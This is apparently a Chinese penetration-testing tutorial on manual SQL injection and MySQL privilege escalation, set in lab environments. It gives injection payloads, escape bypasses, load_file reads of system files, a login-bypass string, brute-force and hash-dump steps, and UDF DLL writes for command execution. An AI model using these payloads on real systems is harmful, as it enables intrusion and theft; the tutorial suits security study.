## 0x00 导读
先来看一下 DB-Engines 排名根据其受欢迎程度对数据库管理系统的排名情况
![](https://images.gitbook.cn/21208750-c63f-11e9-b1d0-e193f39e1860)
其实，数据库系统这门课是这学期要学的，各数据库怎么样我就不过多评价班门弄斧了，不过上图可以很明显的反映出企业在生产环境下使用的数据库情况，既然这样，那么在渗透测试中我们必然要掌握其相关注入手法及经典的漏洞提权利用。
## 0x01 MySQL 数据库手工注入
下图介绍来截自 W3C ![](https://images.gitbook.cn/5dc55c60-c641-11e9-863a-efd6ae74ec5e)
更多详细 MySQL 教程见: https://www.w3cschool.cn/mysql/mysql-tutorial.html  
我们经常见到的就 PHP + MySQL 这样一个环境
该环境下有这样一个数据库管理工具: phpmyadmin
![](https://images.gitbook.cn/e93e82c0-c642-11e9-863a-efd6ae74ec5e)
登陆后如下图![在这里插入图片描述](https://images.gitbook.cn/90278b90-c643-11e9-b4a2-dd4e61833115)
关于 phpmyadmin 常见的安全风险有弱口令爆破等。
phpmyadmin简单介绍到这里，下面我们进入正题:关于 MySQL 的手工注入
### MySQL 手工注入
在数据查询语句到大数据库执行查询功能之前，首先经过后端脚本的处理，可以说，关于注入绝大部分过滤机制及防御都是经过后端脚本语言经过处理再交由数据库查询，既然这样，我们先从后端脚本语言 PHP 入手。
##### PHP注入基础
很重要的一点 **magic_quotes_gpc**开关
```
产生的后果就是对于 GET/POST/Cookie 提交的数据中的单引号、双引号、反斜线和空
字节进行转义，也就是在这个字符前面加上反斜线，提交的 ’ 单引号会变成 \'。
在较新的 PHP 配置文件 php.ini 中，magic_quotes_gpc 这个开关默认是打开的。
```
这对我们的注入造成了很大的障碍，当然并不是完全没有办法注入
我们来看一下实验环境。(本次设计的所有实验环境皆可联系我获取)
![](https://images.gitbook.cn/2175c7b0-c649-11e9-9e70-c92e65b27251)
我们来加单引号测试一下
![](https://images.gitbook.cn/4098d1a0-c649-11e9-9e70-c92e65b27251)
1. 可见，由于 magic_quotes_gpc 默认是 on 的状态，将单引号进行了转义。
2. 同时这个报错信息，也告诉我们数据库类型，以及所执行的操作类型，要有数据库系统执行的查询语句，方便我们构造注入语句。
3. 在 SQL 语句中我们可以看到表名是 dv_group_board ，我们可以猜测，该数据库所创建的数据库都是 dv_ 为前缀进行命名的，这对我们猜解其他表打下了基础，其次我们可以看查询的只有一个字段，这也方便了我们使用联合查询获取数据库。

下面我们对其进行绕过，我们先来看一下单引号的 URL 编码 : 是 %27， 我们使用 %27 带入尝试一下
![](https://images.gitbook.cn/d6ee0240-c64b-11e9-b4a2-dd4e61833115)
我们再尝试一下 %2527
![在这里插入图片描述](https://images.gitbook.cn/47dab340-c64c-11e9-9e70-c92e65b27251)已成功绕过，我们来看一下为什么 %2527 可以进行绕过，%25 经过 URL 解码是 % 本身，后面跟 27 再次形成了 URL 格式的编码，组合成 %27 URL解码为单引号。
另外在查询数据时，既然对单引号等进行转义处理，我们能不能有一种方法不使用单引号，例如我们要判断要获取的数据的第一位，假设第一位为 a，我们可以直接这样判断，expr = 'a' ，expr 表示通过一系列语句使得数据库返回值为 a ，在通过逻辑表达式与  'a' 比较的布尔值进行判断，既然不能使用单引号，我们这里就要换一种思路，还有什么可以表示字符 a 呢。
```
第一种方法：ASCII 码的转换
测试 URL：http://192.168.140.140/dvbbsnews/boardrule.php?groupboardid=1 and left(boardname,1)='a'
既然不能使用单引号，通过 ASCII 码，我们可以这样绕过：
http://192.168.140.140/dvbbsnews/boardrule.php?groupboardid=1 and left(boardname,1)= char(97)
```
![](https://images.gitbook.cn/4accb830-c64e-11e9-b4a2-dd4e61833115)我们也可以将字符串转换为十六进制形式进行绕过。
##### union联合查询
通过联合查询我们可以跨表查询相关数据
我们大致看一下语法
```
select col1,col2,col3 from table_A
union
select colA,colB,colC from table_B;
```
接着上面的注入点我们来测试一下
![在这里插入图片描述](https://images.gitbook.cn/345ac230-c64f-11e9-863a-efd6ae74ec5e)
可见，由于 id 的值改为了 -1，查询不到原本的数据，但是后面的联合查询可以，将后面的数据显示在了原来的位置。
上面通过报错信息我们分析过，原本查询的 SQL 语句，只有一个字段，所以后面也跟了一个字段。那么如果我们不知道前表查询的字段个数时，我们可以手工猜解
```
union select 1
union select 1,2
union select 1,2,3
....
以此类推，不断的带入尝试猜解
直到页面返回的数据正常，说明前后表联合查询列数一致
我们也可以使用空字符 null 进行填充
union select null
union select null,null
Oracle 数据库需要注意的一点，联合查询后表一定要跟 Oracle的默认空表 dual，
也就是这样：union select null from dual
```


我们来归纳一个使用联合查询获取数据要注意的点：
1. 前后表的列数要相同
2. 我们也可以判断字段的数据类型，前后表对应的字段数据类型要一致或兼容
3. 如果前表出错，将返回后表的结果
##### 手工注入步骤
一、判断注入点
```
http://192.168.140.140/dvbbsnews/boardrule.php?groupboardid=1
在出入点后面通过加逻辑表达式影响返回页面差异判断是否影响了查询逻辑
and 1=1 正常
and 1=2 错误
如果是这样，说明这个逻辑影响了最终的数据库查询，说明注入的内容带入了
数据库查询，这样就形成了 SQL 注入
```
![在这里插入图片描述](https://images.gitbook.cn/a7cb3b10-c653-11e9-9e70-c92e65b27251)
![在这里插入图片描述](https://images.gitbook.cn/b70bf470-c653-11e9-b4a2-dd4e61833115)
二、判断用户名
```
id=-1 union select user()
```
![在这里插入图片描述](https://images.gitbook.cn/d0c753a0-c653-11e9-9e70-c92e65b27251)
三、判断版本号
```
id=-1 union select version()
```
![在这里插入图片描述](https://images.gitbook.cn/e359f720-c653-11e9-b4a2-dd4e61833115)
四、判断当前连接数据库
```
id=-1 union select database()
```
![在这里插入图片描述](https://images.gitbook.cn/f433c710-c653-11e9-b1d0-e193f39e1860)
五、判断表名
```
id=-1 union select 1 from dv_admin
若存在 dv_admin 表，则显示正常
否则显示错误
```
![在这里插入图片描述](https://images.gitbook.cn/0f5d0e20-c654-11e9-9e70-c92e65b27251)
![在这里插入图片描述](https://images.gitbook.cn/1a85a730-c654-11e9-b1d0-e193f39e1860)
六、判断字段
```
在成功猜解表名的情况下猜解判断字段名
id=-a union select username from dv_admin
若存在 username 字段，则显示正常
否则显示错误
```
![在这里插入图片描述](https://images.gitbook.cn/314ea160-c654-11e9-b4a2-dd4e61833115)
七、读文件
```
id=-1 union select load_file(c:\boot.ini)
这个时候就有问题了，由于前面提到的转义的问题，这里 ‘ 和 \ 会被转义，导致
路径错误。我们上面提到了 ASCII 码的思路，这里我们使用十六进制进行绕过。
将 'c:\boot.ini' 转换成十六进制 
	--> 0x633A5C626F6F742E696E69
id=-1 union select load_file(0x633A5C626F6F742E696E69)
```
![在这里插入图片描述](https://images.gitbook.cn/12d8d1f0-c655-11e9-863a-efd6ae74ec5e)
## 0x03 Access 数据库手工注入
##### MS Access 概述及教程
Microsoft Access是来自Microsoft的数据库管理系统（DBMS），它将关系Microsoft Jet数据库引擎与图形用户界面和软件开发工具相结合。它是Microsoft Office套件应用程序的成员，包括在专业和更高版本中。

详见如下链接：
https://www.w3cschool.cn/ms_access/ms_access_overview.html
##### 本地实验环境![](https://images.gitbook.cn/a0a76b20-c684-11e9-863a-efd6ae74ec5e)
##### Access 手工注入
```
由于上述已经对 MySQL 数据库手工注入做过详细介绍，而不同数据库注入流程大同小异,
我们熟悉了流程之后重点需要放在各数据库独有系统函数及其特性，由此获取数据。下面
其他数据库手工注入流程原理不再过多阐述。
```
一、注入成因：不仅仅是 Access 数据库注入，注入问题及大部分 web 安全漏洞都是由于对用户输入的字符没有或过滤不严。
二、判断注入点
```
注入点如下形式：
	www.xx.com/a.asp?id=1
进而判断：
	id=1 and 1=1
	id=1 and 1=2
如果服务器返回页面没有差异的话，我们可以借助基于时间的注入置于逻辑表达式
打个比方：假设对 MSSQL 数据库进行注入
	and:逻辑与: A AND B IF(systemuser='sa' + xp..cmdshell "ping localhost")
	意思是如果数据库系统用户如果是 sa ，则进行 ping 操作，此时在浏览器虽然看不出页面
	差异，但是服务端返回页面会非常慢，以此在时间上体现出来。
	or:逻辑或:同样我们可以进行上述方法判断
```
观察下图 URL，符合我们熟知的基本注入点形式，然后我们对其进行测试。![](https://images.gitbook.cn/061a07b0-c685-11e9-b4a2-dd4e61833115)![](https://images.gitbook.cn/4b63c310-c685-11e9-b4a2-dd4e61833115)![](https://images.gitbook.cn/7f0efef0-c685-11e9-b1d0-e193f39e1860)
观察页面差异可见能够执行逻辑，存在注入
三、万能口令: 'or'='or'
```
常见的登录查询语句:
select * from admin where username='$username' and password = '$password';
当我们插入 'or' = 'or' 时:
select * from admin where username=''or'='or'' and password = '$password';
我们来划分更明显的看一下:
select * from admin where username=''   or   ' = '    or   ''   and password = '$password';
select * from admin where username=''   or  2>1    or   ''   and password = '$password';
```
四、判断数据库类型
```
常用的我们可以加单引号，如果有报错信息可能会显示数据库类型
另一种方法：
	and (select count(*) from 数据库独有表名)>0;
各数据库独有的数据表，带入查询，若跟 1=1 返回页面相同，也就是正常返回的页面，则说明
是该数据库独有表所属类型数据库
```
数据库独有表：
1. Access: mssysobjects
2. MSSQL: sysobjects
3. MySQL: information_schema.tables
4. Oracle: sys.user_tables

假设经过判断是 Access 数据库，我们下面接着对 Access 数据库进行手工注入

五、判断表名:admin,user,userinfo
```
and (select count(*) from 猜解的表名)>0
```
![](https://images.gitbook.cn/43c22680-c688-11e9-863a-efd6ae74ec5e)六、判断列名:user,pass,username,password,admin_user,admin_pwd....
```
and (select count(猜解的字段名) from 已猜解的表名)>0
```
![在这里插入图片描述](https://images.gitbook.cn/6f314570-c689-11e9-b1d0-e193f39e1860)
七、判断长度:len(字段名)>4
```
and (select len(admin_user) from admin)>4
```
八、判断值:left(admin_user,1)='a'
```
left(admin_user,1) 表示从 admin_user 字段左边取一位
left(admin_user,2)='ad'
left(admin_user,3)='adm'
```
![](https://images.gitbook.cn/e6e45bf0-c68b-11e9-b1d0-e193f39e1860)

























## 0x05 MySQL 渗透测试与漏洞提权利用
渗透测试中，关于 MySQL 常见的有 MySQL SQL injection，MySQL UDF MOF 提权，MySQL root 身份验证 bypass，webshell getshell，LPK 劫持，远程代码执行 RCE 等。

本次实验环境：
+ 靶机: Win10，MySQL5.5.62
+ 试验机: kali linux

##### MySQL 端口信息收集
一、使用 nmap 收集
```
默认端口号：TCP 3306
nmap -sS -sV -p 3306 192.168.1.161
```
![在这里插入图片描述](https://images.gitbook.cn/f0e11240-c656-11e9-b1d0-e193f39e1860)通过扫描我们可以尝试使用 MySQL client 进行登录猜解

二、使用 metasploit 的辅助模块进行收集
![在这里插入图片描述](https://images.gitbook.cn/7bc67990-c657-11e9-b1d0-e193f39e1860)![在这里插入图片描述](https://images.gitbook.cn/80dde170-c657-11e9-b4a2-dd4e61833115)![在这里插入图片描述](https://images.gitbook.cn/a1c09cc0-c657-11e9-b4a2-dd4e61833115)
![在这里插入图片描述](https://images.gitbook.cn/b4c059f0-c657-11e9-863a-efd6ae74ec5e)
获取了一些基本的信息，下一步我们来尝试登录
##### MySQL 登录信息暴力破解
一、可使用 burp，phpMyAdmin 等类似多线程工具破解 MySQL 密码

二、使用 metasploit 模块暴力破解
![在这里插入图片描述](https://images.gitbook.cn/8b461b40-c658-11e9-b4a2-dd4e61833115)
![在这里插入图片描述](https://images.gitbook.cn/c3a409c0-c658-11e9-9e70-c92e65b27251)
大家可以指定字典，也可以指定用户名密码进行登录
![在这里插入图片描述](https://images.gitbook.cn/3354b850-c659-11e9-863a-efd6ae74ec5e)
##### MySQL 哈希值枚举
使用 metasploit 模块 auxiliary/scanner/mysql/mysql_hashdump 进行哈希枚举
![在这里插入图片描述](https://images.gitbook.cn/0ec55340-c65a-11e9-863a-efd6ae74ec5e)
进行相关设置就可以开始枚举了![在这里插入图片描述](https://images.gitbook.cn/16b44520-c65a-11e9-9e70-c92e65b27251)
拿到 哈希值之后，我们可以尝试使用 hashcat 等工具进行破解，也可以选择在线的平台进行查询破解，例如：cmd5,xmd5,somd5等
##### 获取 MySQL 更多的信息
![在这里插入图片描述](https://images.gitbook.cn/8be815b0-c65a-11e9-9e70-c92e65b27251)
![在这里插入图片描述](https://images.gitbook.cn/954082a0-c65a-11e9-b1d0-e193f39e1860)
##### MySQL 密码哈希的加密算法
MySQL 采用了 2 次 SHA1,加杂 1 次 unhex 方式对用户的密码进行加密
具体的算法用公式表示为：`password_str = concat('*',sha1(unhex(sha1(password))))`
在这里插入图片描述
![在这里插入图片描述](https://images.gitbook.cn/1b234290-c65b-11e9-b4a2-dd4e61833115)
##### MySQL 身份认证绕过 bypass 漏洞 (CVE-2012-2122)
当连接 MariaDB/MySQL 时，输入的密码会与期望的正确密码进行比较，由于不正确的处理，会导致 memcmp(）返回非零值 1，会使 MySQL 认为两个密码是相同的，从而经过了身份认证。
如此，只要知道用户名，不断尝试就能够直接登入 MySQL 数据库。
大约碰撞 256 次就能猜对一次。
受影响的产品：
All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22,5.5.23 存在漏洞
MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 不存在漏洞
MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not 不存在漏洞

**实验环境**
docker 下 vulhub 集成漏洞环境
首先开启 docker 服务并准备实验环境
![在这里插入图片描述](https://images.gitbook.cn/d6ee67b0-c65c-11e9-9e70-c92e65b27251)
我们来查看一下 README.md 文件
![在这里插入图片描述](https://images.gitbook.cn/03d15760-c65d-11e9-b1d0-e193f39e1860)
下面我们执行一下 Poc
编辑 mysql_auth_pass.sh 文件并执行
![在这里插入图片描述](https://images.gitbook.cn/424977c0-c65d-11e9-863a-efd6ae74ec5e)
如图已成功实现认证
![在这里插入图片描述](https://images.gitbook.cn/46f3d080-c65e-11e9-863a-efd6ae74ec5e)
下面我们在用此环境通过 metesploit 模块 auxiliary/scanner/mysql/mysql_authbypass_hashdump 来实现身份认证
![](https://images.gitbook.cn/8cbec9d0-c65e-11e9-b1d0-e193f39e1860)
![](https://images.gitbook.cn/b7e7f4c0-c6d0-11e9-b861-dbde431d1d52)
#####  MySQL UDF 漏洞提权与利用
一、UDF 提权，是利用 MySQL 自定义函数功能将 MySQL 账号转换为 system 权限。
提权利用的条件：
1. 目标系统是 Windows
2. 已破解 MySQL 账号且账号拥有 insert 和 delete 权限
3. secure_file_priv 的值为空值，注意不是 null，说明可以通过 MySQL 导出和导入文件
![在这里插入图片描述](https://images.gitbook.cn/25107c60-c6d2-11e9-b861-dbde431d1d52)
登录 MySQL 后，可以查看当前用户的权限
![在这里插入图片描述](https://images.gitbook.cn/05dd9e80-c6d3-11e9-9855-2fd8d7e3570f)
我们可以看到当前用户的权限可以对文件进行读写操作，因此我们可以考虑编写 UDF DLL 库以获得代码执行的能力从而实现提权。

二、什么是 UDF 库？
UDF，user-defined function,意思是，MySQL 用户定义函数，这是 MySQL 的拓展接口，是数据库函数功能的扩展，其添加的新函数可以在 SQL 语句中使用，就像调用系统函数 count() 一样去使用。

更多 MySQL 官方介绍:
+ https://dev.mysql.com/doc/refman/5.5/en/adding-functions.html
+ https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
+ https://dev.mysql.com/doc/refman/5.5/en/adding-udf.html

在 Kali Linux 下，有集成的 UDF库可供我们使用。
![在这里插入图片描述](https://images.gitbook.cn/ee7317b0-c6d3-11e9-a47f-71baaee6905a)**UDF 提权条件**
1. 如果 MySQL 版本大于 5.1，udf.dll 文件必须放置在安装部署目录的 lib\plugin 文件夹下
2. 如果 MySQL 版本小于 5.1，udf.dll 文件必须放在 c:\windows\system32(windows 2003) 或者 c:\winnt\system32(windows 2008)
3. 从 MySQL 5.0.67 开始， UDF 库必须包含在 plugin 文件夹中，我们可以使用 @@plugin_dir 全局变量找到该目录。该变量可以在 mysql.ini 文件中查看和编辑:
![在这里插入图片描述](https://images.gitbook.cn/d4fcbb50-c6d4-11e9-8c86-935cb15ca973)
4. MySQL 一下的版本中，文件必须位于系统动态链接器的搜索目录中，在旧版本中我们可以将 udf.dll 文件上传到以下位置并创建新的 UDF 函数:					
@@datadir|@@basedir\bin|C:\windows|C:\windows\system|C:windows\system32

三、上传动态链接库 udf.dll
5. 在获取 webshell 的情况下，我们可以直接上传文件到相关目录，在移动到相应的 plugin 目录；
6. 另一种我们可以通过将动态链接库文件内容进行编码写入表再导出文件；
7. load_file 函数，支持本地路径，也支持网络路径(以共享文件的形式)，如果希望将 DLL 复制到网络共享文件夹中，就可以通过该函数直接加载并将它写入磁盘。
8. 在没有获取 webshell 的情况下，我们可以先在本地将 udf.dll 文件进行编码，在将内容插入目标数据库表或是直接导出文件到目标系统。
![在这里插入图片描述](https://images.gitbook.cn/b3534d40-c6d7-11e9-8c86-935cb15ca973)![在这里插入图片描述](https://images.gitbook.cn/6bd45070-c6d9-11e9-b861-dbde431d1d52)下面，我们在目标数据库系统执行语句，将以获取的编码内容导入文件
![在这里插入图片描述](https://images.gitbook.cn/06ece770-c6da-11e9-8c86-935cb15ca973)
![在这里插入图片描述](https://images.gitbook.cn/142797a0-c6da-11e9-b861-dbde431d1d52)到这里我们已经成功将 动态链接库写入到目标机器，下面我们先来简单测试一下是否成功，再回过头来介绍其他方法与创建其他函数执行更多系统命令。
![在这里插入图片描述](https://images.gitbook.cn/aa9a4d40-c6da-11e9-9855-2fd8d7e3570f)
![在这里插入图片描述](https://images.gitbook.cn/f96421d0-c6da-11e9-9855-2fd8d7e3570f)
我们已成功的在远程执行命令，将当前目录下的内容导入到桌面 wenrou.txt，下面我们到目标机器查看一下以作验证，是否执行成功。
![在这里插入图片描述](https://images.gitbook.cn/432de710-c6db-11e9-8c86-935cb15ca973)
如图，我们已经成功执行命令。既然我们刚才的思路即操作无误，那么我们回过头来再学习其他的思路。

9. 如果我们已经成功获得 webshell，并将 udf.dll 成功上传带目标系统，那么我们下一步只需要将该文件移动到相应版本正确的目录位置。通过上面的相关函数执行，相信大家可以看懂下面的语句。
```
select load('C:\\phpStudy\\PHPTutorial\\WWW\\lib_mysqludf_sys_64.dll') 
into dumpfile "E:\\mysql5.5.23\\lib\\plugin\\udf.dll";
---
select hex(load_file('C:\\phpStudy\\PHPTutorial\\WWW\\lib_mysqludf_sys_64.dll'))
into dumpfile 'E:\\mysql5.5.23\\lib\\plugin\\udf.dll';
```
10. 创建一个表并将二进制数据插入到十六进制编码流，我们使用此方法导入一个新的 udf.dll。
![在这里插入图片描述](https://images.gitbook.cn/fa750ab0-c6dc-11e9-b861-dbde431d1d52)
![在这里插入图片描述](https://images.gitbook.cn/0b94bd40-c6dd-11e9-a47f-71baaee6905a)
![在这里插入图片描述](https://images.gitbook.cn/7362aef0-c6dd-11e9-a47f-71baaee6905a)![在这里插入图片描述](https://images.gitbook.cn/906d1210-c6dd-11e9-a47f-71baaee6905a)可见，通过将数据写入表导出文件依然没有问题。
11. 从 MySQL 5.6.1 和 MariaDB 10.0.5 开始，新增了 to_base64 和 from_base64 函数，可以绕过 WAF 进行写入，方法跟十六进制写入一样，只需要替换相关的函数，先使用 to_base64 函数在本地获取 udf.dll 的编码，再将其通过 from_base64 写入文件，后面创建用户定义函数流程全部一样的，大家可以自行尝试
##### UDF 实用函数
+ sys_exec 函数，可使用该函数在目标系统上执行系统命令。
+ sys_eval 函数，该函数将执行系统命令，将返回结果标准输出在屏幕上。
+ 有了上面这两个函数，可以完成几乎所有操作吧添加用户，关停服务等等，具体命令靠大家 cmd 命令的掌握程度了。
+ sys_get 函数，该函数返回系统变量的值。
+ sys_bineval 函数，该函数产生新的线程分配内存及传递的参数，并改变 使其执行我们的 shellcode



























































